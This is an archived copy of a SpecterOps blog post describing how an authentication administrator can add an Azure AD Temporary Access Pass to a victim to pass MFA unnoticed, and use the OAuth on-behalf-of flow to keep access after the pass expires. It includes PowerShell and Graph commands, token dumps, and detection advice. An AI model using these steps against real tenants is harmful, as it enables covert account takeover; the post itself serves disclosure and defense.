---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-03-29_id-tap-that-pass.md
original_filename: 2023-03-29_id-tap-that-pass.md
title: I’d TAP That Pass
category: documents
detected_topics:
- oauth
- jwt
- mfa
- command-injection
- otp
- automation-abuse
tags:
- imported
- documents
- oauth
- jwt
- mfa
- command-injection
- otp
- automation-abuse
language: en
raw_sha256: b9fa6031e825253546a81f2a586f0f828e00993e2a7f2e106a0baf0da2d4a6f1
text_sha256: fd994a284d64d1ce7152647f64c2ead737e68e79052a9c63940884f909688605
ingested_at: '2026-06-28T07:32:19Z'
sensitivity: unknown
redactions_applied: true
---

# I’d TAP That Pass

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-03-29_id-tap-that-pass.md
- Source Type: markdown
- Detected Topics: oauth, jwt, mfa, command-injection, otp, automation-abuse
- Ingested At: 2026-06-28T07:32:19Z
- Redactions Applied: True
- Raw SHA256: `b9fa6031e825253546a81f2a586f0f828e00993e2a7f2e106a0baf0da2d4a6f1`
- Text SHA256: `fd994a284d64d1ce7152647f64c2ead737e68e79052a9c63940884f909688605`


## Content

---
title: "I’d TAP That Pass"
page_title: "I’d TAP That Pass - SpecterOps"
url: "https://posts.specterops.io/id-tap-that-pass-8f79fff839ac"
final_url: "https://specterops.io/blog/2023/03/29/id-tap-that-pass/"
authors: ["Daniel Heinsen (@hotnops)"]
bugs: ["Azure AD", "Cloud", "OAuth"]
publication_date: "2023-03-29"
added_date: "2023-03-31"
source: "pentester.land/writeups.json"
original_index: 1328
---

[ Back to Blog  ](/blog)

[Research & Tradecraft](https://specterops.io/blog/category/research/)

# I’d TAP That Pass

Author

[Daniel Heinsen](https://specterops.io/blog/author/hotnops/)

Read Time

22 mins

Published

Mar 29, 2023

##### Share

[ ](https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Fspecterops.io%2Fblog%2F2023%2F03%2F29%2Fid-tap-that-pass%2F&title=I%E2%80%99d+TAP+That+Pass&source=SpecterOps) [ ](https://twitter.com/share?url=https%3A%2F%2Fspecterops.io%2Fblog%2F2023%2F03%2F29%2Fid-tap-that-pass%2F&text=I%E2%80%99d+TAP+That+Pass) [ ](mailto:?Subject=I%20thought%20you'd%20like%20this%20post:%20I’d TAP That Pass&Body=https://specterops.io/blog/2023/03/29/id-tap-that-pass/) [ ](https://specterops.io/blog/category/research/feed/)

### Summary:

Given that:

  1. Temporary Access Passes (TAP) are enabled in the Azure AD tenant  
**AND**
  2. You have an authentication admin role in Azure AD

You can assign users a short lived password called a Temporary Access Pass (TAP) that satisfies most multi-factor authentication requirements implemented in Azure AD conditional access without alerting the user or modifying their existing password. In addition, you can take advantage of the OAuth on-behalf-of (OBO) flow to maintain access to the target account, even after the TAP has expired. **Edit:** As of 3/24/2023, Microsoft has fixed the issue of refresh tokens remaining valid after a TAP has expired. I’ll elaborate further in the appropriate sections.

### Read First:

  * [Configure a Temporary Access Pass in Azure AD to register Passwordless authentication methods – Microsoft Entra](https://learn.microsoft.com/en-us/azure/active-directory/authentication/howto-authentication-temporary-access-pass)
  * [Microsoft identity platform and OAuth2.0 On-Behalf-Of flow – Microsoft Entra](https://learn.microsoft.com/en-us/azure/active-directory/develop/v2-oauth2-on-behalf-of-flow)

### Drink First:

Coconut cream is key. Take this seriously.

[The Painkiller Is an Easy, Delicious Tropical Cocktail](https://www.thespruceeats.com/painkiller-cocktail-recipe-760473)

### Intro

In order to add a Temporary Access Pass (TAP) to a user, you’ll need to be:

  * an [authentication admin](https://learn.microsoft.com/en-us/azure/active-directory/roles/permissions-reference#authentication-administrator) OR
  * [privileged authentication admin](https://learn.microsoft.com/en-us/azure/active-directory/roles/permissions-reference#privileged-authentication-administrator) OR
  * [UserAuthenticationMethod.ReadWrite.All](https://graphpermissions.merill.net/permission/UserAuthenticationMethod.ReadWrite.All)

In addition, if you want to enable temporary access passes for the tenant, you’ll need to be either:

  * An [Authentication Policy Administrator](https://learn.microsoft.com/en-us/azure/active-directory/roles/permissions-reference#authentication-policy-administrator) or jazzier OR
  * [Policy.ReadWrite.AuthenticationMethod](https://graphpermissions.merill.net/permission/Policy.ReadWrite.AuthenticationMethod)

That’s a lot of privilege. If you have any of these privileges, you’ve likely already done some heavy lifting. However, this is still a powerful addition to our Azure AD tradecraft and by the end of this post, I’ll have you convinced that **TAPs are hella cool**.

On our red team engagements and penetration tests, conditional access policies (CAP) often hinder our ability to directly authenticate as a target user. We may have a set of elevated privileges, we may have valid credentials for a target user, but that last step of actually authenticating as the target user is becoming increasingly elusive. TAP abuse helps us with that issue in two ways:

  1. We can add a temporary password to a victim user without invalidating their existing password, ensuring that the user won’t notice a password change. Even better, we aren’t forced to change a password on a critical automation account and potentially break some critical system, like a CI/CD pipeline. According to Microsoft documentation: “[Users can also continue to sign-in by using their password; a TAP doesn’t replace a user’s password.](https://learn.microsoft.com/en-us/azure/active-directory/authentication/howto-authentication-temporary-access-pass)”
  2. As mentioned above, TAPs satisfy strong multi-factor authentication (MFA) requirements. This means that we can use this password directly, without needing a second factor like an application code or SMS.

### Satisfying MFA requirements with a TAP

Consider the following scenario:

![](https://specterops.io/wp-content/uploads/sites/3/2023/03/1Ia2TeDKfoHG2aMlPzNGG1g.jpeg)Example Scenario

In this scenario, an attacker has an agent installed on _User A_ ’s workstation, thus has the ability to perform actions in Azure AD as _User A_. _User A_ is an authentication administrator. With this access, the attacker is attempting to authenticate as _User B._ There are two CAPs in place:

  1. Users can only authenticate from the Target VPN
  2. MFA is required

In this scenario, CAP 1 requires our attacker to pivot through _User A’s_ workstation because the authentication attempts need to originate from the Target VPN. Because the attacker has the privilege of an authentication administrator, they _could_ change the password of _User B_ , but they would still be blocked by the MFA CAP. In addition, changing a user password is noisy as hell.

This is why we need a TAP.

To see the difference between a password token vs a TAP token, we can use [AADInternals](https://aadinternals.com/aadinternals/). The first login, shown below, is a vanilla login with no MFA and a normal password in an unauthenticated context:
  
  
  # Unauthenticated context
  $token = Get-AADIntAccessTokenForMSGraph -Credentials $cred
  Parse-JWTtoken $token
  
  aud  : https://graph.microsoft.com
  iss  : https://sts.windows.net/6c12b0b0-b2cc-4a73-8252-0b94bfca2145/
  ...
  acct  : 0
  acr  : 1
  aio  : E2ZgYE...
  amr  : {pwd}
  app_displayname  : Azure Active Directory PowerShell
  appid  : 1b730954-1685-4b74-9bfd-dac224a7b894
  appidacr  : 0
  family_name  : Test
  given_name  : Tap
  idtyp  : user
  ipaddr  : NON VPN IP
  name  : Tap Test
  oid  : 515a273b-5b90-4a4a-9829-94f0dd0c94be
  platf  : 3
  puid  : 10032002642015C3
  rh  : 0.AVEAsLASbMyyc0qCUguUv8ohRQMAAAAAAAAAwAAAAAAAAABRAL8.
  scp  : Agreement.Read.All Agreement.ReadWrite.All AgreementAcceptance.Read AgreementAcceptance.Read.All AuditLog.Read.All
  Directory.AccessAsUser.All Directory.ReadWrite.All Group.ReadWrite.All IdentityProvider.ReadWrite.All
  Policy.ReadWrite.TrustFramework PrivilegedAccess.ReadWrite.AzureAD PrivilegedAccess.ReadWrite.AzureADGroup
  PrivilegedAccess.ReadWrite.AzureResources TrustFrameworkKeySet.ReadWrite.All User.Invite.All
  sub  : ZQX***REDACTED-SUSPECT-TOKEN***  tenant_region_scope : NA
  tid  : 6c12b0b0-b2cc-4a73-8252-0b94bfca2145
  unique_name  : taptest@specterdev.onmicrosoft.com
  upn  : taptest@specterdev.onmicrosoft.com

In the _amr_ claim, notice the _pwd_ value. This indicates that the access token was obtained with a standard password and has not been authenticated with another factor. Now, we’re going to add two CAPs to simulate the scenario described above for our target user  _taptest_.

![](https://specterops.io/wp-content/uploads/sites/3/2023/03/1MkLzKUtQ-I4ZvYFUyW3RcQ.png)Conditional Access Policies for Tap Test User Courtesy of [RoadRecon](https://github.com/dirkjanm/ROADtools)

Now when we try to authenticate, we get an error:
  
  
  # Unauthenticated context
  $token = Get-AADIntAccessTokenForAADGraph -Credentials $cred -SaveToCache
  AADSTS50079: Due to a configuration change made by your administrator, or because you moved to a new location, you must enroll in multi-factor
  authentication to access '0000000-0000-0000-c000-000000000000'.

Perfect. The CAP is working as intended. Now, let’s add a TAP. You can do this with the following code. This command should be run in the context of _User A_ in the scenario described above. The _$headers_ variable contains the bearer token with the audience of the graph explorer application. You know how it is.
  
  
  # Context of User A
  $body
  
  Name  Value
  ----  -----
  isUsableOnce  False
  lifetimeInMinutes  60
  
  
  Invoke-WebRequest -Headers $headers -Method POST -Body $body https://graph.microsoft.com/v1.0/users/<user id>/authentication/temporaryAccessPassMethods

The result gets us the password “9+g6$523” for the user _taptest@specterdev.onmicrosoft.com_. It’s expired by the time you read this but I understand that you need to go check it anyways.

All Good? Good.

Now that we have our TAP, we’re going to try the same authentication attempt but with the TAP instead:
  
  
  # Unauthenticated context
  $token = Get-AADIntAccessTokenForMSGraph
  # Enter TAP when prompted
  Parse-JWTToken $token
  
  ...
  
  aud  : https://graph.microsoft.com
  iss  : https://sts.windows.net/6c12b0b0-b2cc-4a73-8252-0b94bfca2145/
  iat  : 1673623990
  nbf  : 1673623990
  exp  : 1673629641
  acct  : 0
  acr  : 1
  aio  : AVQAq/8TAAAAp9gPKmzkTM8e6LBhxhAC0hoAsnfilVm/xqg***REDACTED-SUSPECT-TOKEN***  A49OPf/hyo+S/DuLboO6LtnXCX27lB+Y=
  amr  : {tap, mfa}
  app_displayname  : Azure Active Directory PowerShell
  appid  : 1b730954-1685-4b74-9bfd-dac224a7b894
  appidacr  : 0
  family_name  : Test
  given_name  : Tap
  idtyp  : user
  ipaddr  : NON VPN IP
  name  : Tap Test
  oid  : 515a273b-5b90-4a4a-9829-94f0dd0c94be
  platf  : 3
  puid  : 10032002642015C3
  rh  : 0.AVEAsLASbMyyc0qCUguUv8ohRQMAAAAAAAAAwAAAAAAAAABRAL8.
  scp  : Agreement.Read.All Agreement.ReadWrite.All AgreementAcceptance.Read
  AgreementAcceptance.Read.All AuditLog.Read.All Directory.AccessAsUser.All
  Directory.ReadWrite.All Group.ReadWrite.All IdentityProvider.ReadWrite.All
  Policy.ReadWrite.TrustFramework PrivilegedAccess.ReadWrite.AzureAD
  PrivilegedAccess.ReadWrite.AzureADGroup PrivilegedAccess.ReadWrite.AzureResources
  TrustFrameworkKeySet.ReadWrite.All User.Invite.All
  sub  : ZQX***REDACTED-SUSPECT-TOKEN***  tenant_region_scope : NA
  tid  : 6c12b0b0-b2cc-4a73-8252-0b94bfca2145
  unique_name  : taptest@specterdev.onmicrosoft.com
  upn  : taptest@specterdev.onmicrosoft.com
  ...

Note that the call was successful, even though we didn’t perform any MFA actions!

This is awesome.

Second, note that the token contains the _mfa_ value in the [_amr_](https://www.rfc-editor.org/rfc/rfc8176.html) claim. This indicates that your TAP counts as ‘[strong](https://learn.microsoft.com/en-us/azure/active-directory/authentication/concept-authentication-strengths) authentication’, and any conditional access policy that requires MFA will be satisfied (except for “Passwordless” and “Phishing Resistant” strengths).

This can be a useful tool for a red team in which they:

  1. Are unable to authenticate to the target user because they can’t obtain the plaintext password
  2. Are able to obtain or modify the plaintext password but still can’t authenticate due to lack of access to the targets multi-factor authentication method

### Not Just For Registering Passwordless

Microsoft documentation will direct you to use your TAP to register your passwordless authentication at <https://aka.ms/mysecurityinfo>, as that is the original intent. However, there’s nothing stopping you from authenticating with any other OAuth client, such as the AzureAD powershell module.
  
  
  # Unauthenticated context
  Get-AADIntAccessTokenForMSGraph -SaveToCache

![](https://specterops.io/wp-content/uploads/sites/3/2023/03/1EzqSd_kiGzTdmRSjwkUlWw.gif)

You now have a refresh token for which you can obtain access tokens for other clients within the same [family of client ID’s (FOCI](https://learn.microsoft.com/en-us/azure/active-directory/reports-monitoring/concept-all-sign-ins)) (check out this sweet [github repo](https://github.com/secureworks/family-of-client-ids-research)).

Refresh token?

That doesn’t sound very temporary. Unfortunately for us, that refresh token will expire when the TAP expires, which is at most **eight hours**. This means that you can request new access tokens with your refresh token for up to eight hours, but then the refresh token is useless because the temporary access pass used to obtain the refresh token is no longer valid. We want better. We **_deserve_** better.

**_What if there were a way to wash the TAP stank off that refresh token and keep your access after the TAP expired?_**

### On-Behalf-Of (OBO) Persistence

There is one OAuth flow that may help us keep the party alive. I’m talking about the “[on-behalf-of](https://learn.microsoft.com/en-us/azure/active-directory/develop/v2-oauth2-on-behalf-of-flow)” flow. Let’s see if we can use this to our advantage and persist access with a TAP.

![](https://specterops.io/wp-content/uploads/sites/3/2023/03/1dWMcYf7Vk4aMjX3AlnM7RA.jpeg)OBO Flow for Our Experiment

First, we will need to register a new Azure AD application. This doesn’t necessarily need to be in the same tenant, but it’s better if you can to avoid Microsoft blocking it as a “risky” application. This application will act as the “middleware” in our “on-behalf-of” flow. The reason why we need to create an application is so that we can use the client secret to obtain the intermediary token from the middleware API to use with the back-end API, which will be Microsoft Graph. The _hope_ here is that the back-end token will be “washed” of the TAP value in the _amr_ claim and will last longer than the temporary access pass. Let’s get to it.

1\. First we create our mock “middleware” application. We need to create a client secret and save it off. In this test we also expose an API, even though it won’t do anything. I gave the application every API permission that doesn’t require Administrator consent.

![](https://specterops.io/wp-content/uploads/sites/3/2023/03/1ZmaQWakj6tZ9JdIv3ldx_g.png)Every API Permission that Doesn’t Require Admin Consent ![](https://specterops.io/wp-content/uploads/sites/3/2023/03/11N0QnCsQ1J8eM0G9du5YJA.png)Exposing an API Called tokenwash

2\. Now we will be acting in the context of the middleware application. In order to simulate an on-behalf-of authentication flow, we’ll need an access token for our TAP’d user. We can obtain this token with AADInternals. Note that we will need to consent to the graph API permissions. Using the device code flow and a browser will take you through the appropriate consent flow.
  
  
  $middleware_token = Get-AADIntAccessToken -ClientId <Client ID of middleware app> -Resource <Client ID of middleware app> -UseDeviceCode

3\. We can parse the returned JWT and see that it still is marked as “mfa, tap” for the amr section:
  
  
  aud  : 1efbd471-3de4-476a-8afd-b3203ce16a91
  iss  : https://sts.windows.net/6c12b0b0-b2cc-4a73-8252-0b94bfca2145/
  ...
  acr  : 1
  aio  : AVQAq/8TAAAAMwsRobmyfwGdg6LN9iOtjgJziEQp7RkHGGcnKFpDaUsgDO3vZ5dxehhmRsyUb0lCcxvVRYqCvK+pO4dFn9ZNBhl9eBxVm0umDT9iAGe8KzA=
  amr  : {tap, mfa}
  appid  : 1efbd471-3de4-476a-8afd-b3203ce16a91
  appidacr  : 0
  family_name : Test
  given_name  : Tap
  ipaddr  : VPN IP
  name  : Tap Test
  oid  : 515a273b-5b90-4a4a-9829-94f0dd0c94be
  rh  : 0.AVEAsLASbMyyc0qCUguUv8ohRXHU-x7kPWpHiv2zIDzhapFRAL8.
  scp  : Acronym.Read.All AppCatalog.Read.All AppCatalog.Submit AttackSimulation.ReadWrite.All Bookings.Manage.All Bookings.Read.All Bookings.ReadWrite.All BookingsAppointment.ReadWrite.All
  Calendars.Read Calendars.Read.Shared Calendars.ReadBasic Calendars.ReadWrite Calendars.ReadWrite.Shared Channel.ReadBasic.All ChannelMessage.Edit ChannelMessage.Send Chat.Create Chat.Read
  Chat.ReadBasic Chat.ReadWrite ChatMessage.Read ChatMessage.Send CloudPC.Read.All Contacts.Read Contacts.Read.Shared Contacts.ReadWrite Contacts.ReadWrite.Shared Device.Command Device.Read
  DigitalHealthSettings.Read EAS.AccessAsUser.All email EntitlementMgmt-SubjectAccess.ReadWrite EWS.AccessAsUser.All Family.Read Files.Read Files.Read.All Files.Read.Selected Files.ReadWrite
  Files.ReadWrite.All Files.ReadWrite.AppFolder Files.ReadWrite.Selected Financials.ReadWrite.All IMAP.AccessAsUser.All IndustryData.ReadBasic.All InformationProtectionPolicy.Read Mail.Read
  Mail.Read.Shared Mail.ReadBasic Mail.ReadBasic.Shared Mail.ReadWrite Mail.ReadWrite.Shared Mail.Send Mail.Send.Shared MailboxSettings.Read MailboxSettings.ReadWrite
  NetworkAccessBranch.Read.All NetworkAccessPolicy.Read.All Notes.Create Notes.Read Notes.Read.All Notes.ReadWrite Notes.ReadWrite.All Notes.ReadWrite.CreatedByApp
  Notifications.ReadWrite.CreatedByApp offline_access OnlineMeetingArtifact.Read.All OnlineMeetings.Read OnlineMeetings.ReadWrite openid People.Read Policy.Read.ConditionalAccess
  POP.AccessAsUser.All Presence.Read Presence.Read.All Presence.ReadWrite PrinterShare.Read.All PrinterShare.ReadBasic.All PrintJob.Create PrintJob.Read PrintJob.ReadBasic PrintJob.ReadWrite
  PrintJob.ReadWriteBasic profile QnA.Read.All ShortNotes.Read ShortNotes.ReadWrite Sites.Manage.All Sites.Read.All Sites.ReadWrite.All SMTP.Send Tasks.Read Tasks.Read.Shared Tasks.ReadWrite
  Tasks.ReadWrite.Shared Team.Create Team.ReadBasic.All TeamsActivity.Read TeamsActivity.Send TeamsAppInstallation.ReadForChat TeamsAppInstallation.ReadForUser TeamsTab.ReadWriteForUser
  TeamsTab.ReadWriteSelfForUser TeamTemplates.Read TeamworkAppSettings.Read.All ThreatSubmission.Read ThreatSubmission.ReadWrite User.Read User.ReadBasic.All User.ReadWrite
  UserActivity.ReadWrite.CreatedByApp UserNotification.ReadWrite.CreatedByApp UserTimelineActivity.Write.CreatedByApp
  sub  : bfWWve9KN8ykFqvsAVI-53rZ501f68Gd9wGBz4eewO0
  tid  : 6c12b0b0-b2cc-4a73-8252-0b94bfca2145
  unique_name : taptest@specterdev.onmicrosoft.com
  upn  : taptest@specterdev.onmicrosoft.com
  ...

That’s expected. But now, let’s use it in an on-behalf-of flow to obtain a back-end token, hopefully washed clean and usable for longer than an hour or eight.

4\. According to Microsoft [documentation](https://github.com/secureworks/family-of-client-ids-research), our payload needs to have the “requested_token_use” field set to “on_behalf_of”.

![](https://specterops.io/wp-content/uploads/sites/3/2023/03/1RVrEOWU8h2b-pLfbrUIv3Q.png)On-behalf-of Flow from Microsoft Documentation

We’ll follow the documentation steps, but replace the client_id, client_secret, and assertion with the appropriate values. We’ll also set the scope to “https://graph.microsoft.com/.default offline_access”, to get all the API permissions we can and request refresh tokens.
  
  
  $backend_resp = Invoke-WebRequest -Method POST -Headers $headers -Body $obo_body https://login.microsoftonline.com/<tenant_id>/oauth2/v2.0/token

Let’s now dump out the returned JWT and see if we successfully scrubbed our token:
  
  
  $access_token = ($backend_resp | ConvertFrom-Json).access_token
  
  
  aud  : https://graph.microsoft.com
  iss  : https://sts.windows.net/6c12b0b0-b2cc-4a73-8252-0b94bfca2145/
  ..
  acct  : 0
  acr  : 1
  aio  : AVQAq/8TAAAAJE4cMHAttKvlihhqlj/7AJU6M9r0vPERUJ6dkjOez/z0Y/ywiAGc2e8nMv6Ev6BWhj2kie9fdA4i1OVxvhkNFT49kR6xM5lgwxVNni+XMPo=
  amr  : {tap, mfa}
  app_displayname  : obo-test
  appid  : 1efbd471-3de4-476a-8afd-b3203ce16a91
  appidacr  : 1
  family_name  : Test
  given_name  : Tap
  idtyp  : user
  ipaddr  : VPN IP
  name  : Tap Test
  oid  : 515a273b-5b90-4a4a-9829-94f0dd0c94be
  platf  : 3
  puid  : 10032002642015C3
  rh  : 0.AVEAsLASbMyyc0qCUguUv8ohRQMAAAAAAAAAwAAAAAAAAABRAL8.
  scp  : Acronym.Read.All AppCatalog.Read.All AppCatalog.Submit AttackSimulation.ReadWrite.All Bookings.Manage.All Bookings.Read.All Bookings.ReadWrite.All BookingsAppointment.ReadWrite.All Calendars.Read Calendars.Read.Shared Calendars.ReadBasic Calendars.ReadWrite
  Calendars.ReadWrite.Shared Channel.ReadBasic.All ChannelMessage.Edit ChannelMessage.Send Chat.Create Chat.Read Chat.ReadBasic Chat.ReadWrite ChatMessage.Read ChatMessage.Send CloudPC.Read.All Contacts.Read Contacts.Read.Shared Contacts.ReadWrite
  Contacts.ReadWrite.Shared Device.Command Device.Read DigitalHealthSettings.Read EAS.AccessAsUser.All email EntitlementMgmt-SubjectAccess.ReadWrite EWS.AccessAsUser.All Family.Read Files.Read Files.Read.All Files.Read.Selected Files.ReadWrite Files.ReadWrite.All
  Files.ReadWrite.AppFolder Files.ReadWrite.Selected Financials.ReadWrite.All IMAP.AccessAsUser.All IndustryData.ReadBasic.All InformationProtectionPolicy.Read Mail.Read Mail.Read.Shared Mail.ReadBasic Mail.ReadBasic.Shared Mail.ReadWrite Mail.ReadWrite.Shared Mail.Send
  Mail.Send.Shared MailboxSettings.Read MailboxSettings.ReadWrite NetworkAccessBranch.Read.All NetworkAccessPolicy.Read.All Notes.Create Notes.Read Notes.Read.All Notes.ReadWrite Notes.ReadWrite.All Notes.ReadWrite.CreatedByApp Notifications.ReadWrite.CreatedByApp
  OnlineMeetingArtifact.Read.All OnlineMeetings.Read OnlineMeetings.ReadWrite openid People.Read Policy.Read.ConditionalAccess POP.AccessAsUser.All Presence.Read Presence.Read.All Presence.ReadWrite PrinterShare.Read.All PrinterShare.ReadBasic.All PrintJob.Create
  PrintJob.Read PrintJob.ReadBasic PrintJob.ReadWrite PrintJob.ReadWriteBasic profile QnA.Read.All ShortNotes.Read ShortNotes.ReadWrite Sites.Manage.All Sites.Read.All Sites.ReadWrite.All SMTP.Send Tasks.Read Tasks.Read.Shared Tasks.ReadWrite Tasks.ReadWrite.Shared
  Team.Create Team.ReadBasic.All TeamsActivity.Read TeamsActivity.Send TeamsAppInstallation.ReadForChat TeamsAppInstallation.ReadForUser TeamsTab.ReadWriteForUser TeamsTab.ReadWriteSelfForUser TeamTemplates.Read TeamworkAppSettings.Read.All ThreatSubmission.Read
  ThreatSubmission.ReadWrite User.Read User.ReadBasic.All User.ReadWrite UserActivity.ReadWrite.CreatedByApp UserNotification.ReadWrite.CreatedByApp UserTimelineActivity.Write.CreatedByApp
  signin_state  : {inknownntwk}
  sub  : ZQX***REDACTED-SUSPECT-TOKEN***  tenant_region_scope : NA
  unique_name  : taptest@specterdev.onmicrosoft.com
  upn  : taptest@specterdev.onmicrosoft.com
  uti  : K7kDU4zVLE6MBg0sVgrgAA
  ver  : 1.0
  ...

Well shit.

It still has the _tap_ value proudly displayed in the _amr_ section, staring at me, giving off some serious schadenfreude vibes.

To be honest, I wasn’t _expecting_ this to work. I thought that I had failed yet again when I saw that _tap_ value in the _amr_ claim. I deleted the TAP and thought:

_“I still have a refresh token from my OBO request. Before I give up, let’s try to reuse that refresh token and see what happens. Hold my painkiller…”_
  
  
  $eternal_payload['client_id'] = "1efbd471-3de4-476a-8afd-b3203ce16a91"
  $eternal_payload['refresh_token'] = ($backend_resp | ConvertFrom-Json).refresh_token
  $eternal_payload['client_secret'] = $client_secret
  $eternal_payload['scope'] = "https://graph.microsoft.com/.default offline_access"
  $eternal_payload['grant_type'] = "refresh_token"
  $free_token = Invoke-WebRequest -Method POST -Headers $headers -Body $eternal_payload $url
  Parse-JWTToken ($free_token.Content | ConvertFrom-Json).access_token
  
  ...
  
  
  aud  : https://graph.microsoft.com
  iss  : https://sts.windows.net/6c12b0b0-b2cc-4a73-8252-0b94bfca2145/
  ...
  acct  : 0
  acr  : 1
  aio  : AVQAq/8TAAAABsyEopLkAOdklTxbv3h7U8++NT6g/NPdM4mtftVdbo7UJgTR0tvwTWTqT8SsQn9K1wB3KUQey2lMTdNI5qR6Yf/Kl+cmNSV0gHFJvybciqA=
  amr  : {tap, mfa}
  app_displayname  : obo-test
  appid  : 1efbd471-3de4-476a-8afd-b3203ce16a91
  appidacr  : 1
  family_name  : Test
  given_name  : Tap
  idtyp  : user
  ipaddr  : < REDACTED VPN IP >
  name  : Tap Test
  oid  : 515a273b-5b90-4a4a-9829-94f0dd0c94be
  platf  : 3
  puid  : 10032002642015C3
  rh  : 0.AVEAsLASbMyyc0qCUguUv8ohRQMAAAAAAAAAwAAAAAAAAABRAL8.
  scp  : Acronym.Read.All AppCatalog.Read.All AppCatalog.Submit AttackSimulation.ReadWrite.All Bookings.Manage.All Bookings.Read.All Bookings.ReadWrite.All BookingsAppointment.ReadWrite.All Calendars.Read Calendars.Read.Shared Calendars.ReadBasic Calendars.ReadWrite
  Calendars.ReadWrite.Shared Channel.ReadBasic.All ChannelMessage.Edit ChannelMessage.Send Chat.Create Chat.Read Chat.ReadBasic Chat.ReadWrite ChatMessage.Read ChatMessage.Send CloudPC.Read.All Contacts.Read Contacts.Read.Shared Contacts.ReadWrite
  Contacts.ReadWrite.Shared Device.Command Device.Read DigitalHealthSettings.Read EAS.AccessAsUser.All email EntitlementMgmt-SubjectAccess.ReadWrite EWS.AccessAsUser.All Family.Read Files.Read Files.Read.All Files.Read.Selected Files.ReadWrite Files.ReadWrite.All
  Files.ReadWrite.AppFolder Files.ReadWrite.Selected Financials.ReadWrite.All IMAP.AccessAsUser.All IndustryData.ReadBasic.All InformationProtectionPolicy.Read Mail.Read Mail.Read.Shared Mail.ReadBasic Mail.ReadBasic.Shared Mail.ReadWrite Mail.ReadWrite.Shared Mail.Send
  Mail.Send.Shared MailboxSettings.Read MailboxSettings.ReadWrite NetworkAccessBranch.Read.All NetworkAccessPolicy.Read.All Notes.Create Notes.Read Notes.Read.All Notes.ReadWrite Notes.ReadWrite.All Notes.ReadWrite.CreatedByApp Notifications.ReadWrite.CreatedByApp
  OnlineMeetingArtifact.Read.All OnlineMeetings.Read OnlineMeetings.ReadWrite openid People.Read Policy.Read.ConditionalAccess POP.AccessAsUser.All Presence.Read Presence.Read.All Presence.ReadWrite PrinterShare.Read.All PrinterShare.ReadBasic.All PrintJob.Create
  PrintJob.Read PrintJob.ReadBasic PrintJob.ReadWrite PrintJob.ReadWriteBasic profile QnA.Read.All ShortNotes.Read ShortNotes.ReadWrite Sites.Manage.All Sites.Read.All Sites.ReadWrite.All SMTP.Send Tasks.Read Tasks.Read.Shared Tasks.ReadWrite Tasks.ReadWrite.Shared
  Team.Create Team.ReadBasic.All TeamsActivity.Read TeamsActivity.Send TeamsAppInstallation.ReadForChat TeamsAppInstallation.ReadForUser TeamsTab.ReadWriteForUser TeamsTab.ReadWriteSelfForUser TeamTemplates.Read TeamworkAppSettings.Read.All ThreatSubmission.Read
  ThreatSubmission.ReadWrite User.Read User.ReadBasic.All User.ReadWrite UserActivity.ReadWrite.CreatedByApp UserNotification.ReadWrite.CreatedByApp UserTimelineActivity.Write.CreatedByApp
  signin_state  : {inknownntwk}
  sub  : ZQX***REDACTED-SUSPECT-TOKEN***  tenant_region_scope : NA
  tid  : 6c12b0b0-b2cc-4a73-8252-0b94bfca2145
  unique_name  : taptest@specterdev.onmicrosoft.com
  upn  : taptest@specterdev.onmicrosoft.com
  uti  : cR9hIrrW5kSxj1GsFmW2AQ
  ver  : 1.0
  ...

What?!? I just got a valid access token from a refresh token obtained from a temporary access password that has been deleted!

This should not be. (_Edit 3/24/23: Ron Howard narrator voice_ : “ _It’s not”_)

Even if an administrator goes in and deletes the TAP, an attacker could still maintain access to the user account. In the process of the OBO flow, we have somehow removed the correlation between the TAP and the refresh token, a process I am calling “OBO persistence”. Granted, in this scenario, you only have access to APIs that don’t require admin consent, but that’s enough to read the users email, Teams messages, OneNote notes, and calendar. In order to revoke this access, an administrator will need to revoke all the user refresh tokens. There’s one more really sweet perk about this access that you may have already spotted…

If you remember from earlier, there was a CAP in place to require that the _taptest_ user only authenticate from the ‘ _SpecterOps-vpn_ ’ trusted location. Yet, I was still able to use my refresh token to obtain fresh access tokens from an untrusted location.

“ _That’s weird and cool_ ” I thought.

I examined the access token returned in the last step above and noticed that the IP address was that of the SpecterOps VPN. Did I forget to turn off the VPN? I re-did the OBO flow, ensuring that I stayed disconnected from the VPN the whole time and reexamined the access token.

**The _ipaddr_ claim was still the VPN IP address to which I was no longer connected! The _signin_state_ claim was set to _inknownntwk_!**

**_That’s a 2FER!_**

<https://medium.com/media/f798a52735aa7803049d792b6b51dec3/href>

Even if we lose access to the target network, we can still use our refresh token to obtain authentication and refresh tokens, subverting the location based conditional access policy! This is likely by design, because middleware needs to act asynchronously from front-end user requests, so the claims used in the frontend token seem to be correlated with the refresh token.

**Any attempt to obtain new refresh tokens will show the original IP address in the sign in logs, making detection particularly difficult.**

We went from:

**_“this is kinda cool”_**

to

**_“I need more TAP in my life”_**

**Heavy Edit** : You will need to find a new way to persist access with a TAP derived credential as Microsoft has fixed this issue. However, using the OBO flow to keep desirable claims in your refresh token is still completely viable, as that is an intentional design decision of the OBO flow.

In other words: **If you can authenticate as a target user with other means and obtain a token to be used in the OBO flow, it will buy you the same level of persistence and CAP subversion.**

### Detection and Remediation

First off, don’t use TAPs if you don’t need to yet. They are disabled by default, so it’s unlikely that you are affected by all this. However, Microsoft is pushing towards passwordless authentication (for good reason), so you’ll definitely see more of this in the future. If and when you decide to enable TAPs, you’ll know exactly what you are signing up for and the new events you should be monitoring.

If you **_are_** using TAPs, they should be used only for new hire or new device on-boarding, and as such, TAP logins should be relatively infrequent.

The following powershell command will return all of the TAP generation events in a tenant. I can’t tell you how to handle your log events, but I would treat this event with heavy scrutiny in my tenant.
  
  
  $tap_generations = Get-AzureADAuditDirectoryLogs -Filter "category eq 'UserManagement'" | Where-Object {$_.ResultReason -like "Admin registered temporary access pass method for user"}

Second, don’t allow all users to create application registrations. This is permitted by default and I don’t think it should be. The documentation to disable this feature is located [here](https://learn.microsoft.com/en-us/azure/active-directory/roles/delegate-app-roles#restrict-who-can-create-applications).

Lastly, you should keep a close eye on users consenting to application permissions. This has been especially true in the past few years due to app consent phishing attacks. As such, this detection may be more nuanced. You can and should restrict which applications a user can consent to, or even block user consent all together. The process for doing so is documented [here](https://learn.microsoft.com/en-us/azure/active-directory/manage-apps/configure-user-consent?pivots=portal). In the event that you cannot block users from consenting to external applications, you’ll want to keep a close eye on the applications they _do_ consent to. There are several ways to do this, but I have listed the two that I expect would be most effective.

